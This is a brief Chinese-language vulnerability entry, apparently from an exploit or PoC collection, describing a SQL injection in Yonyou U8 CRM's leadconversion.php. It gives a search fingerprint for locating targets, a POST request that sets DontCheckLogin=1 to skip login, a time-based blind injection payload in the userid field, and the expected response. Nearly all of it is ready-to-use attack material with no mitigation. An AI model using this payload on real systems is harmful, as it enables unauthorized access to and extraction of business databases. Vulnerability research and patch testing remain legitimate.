# 用友CRMleadconversion存在SQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`title="用友U8CRM"`
- **请求**：`POST /lead/leadconversion.php?DontCheckLogin=1&Action=getDeptName HTTP/1.1`

**Payload**
```
userid=1';WAITFOR+DELAY+'0:0:5'--
```
- **响应特征**：200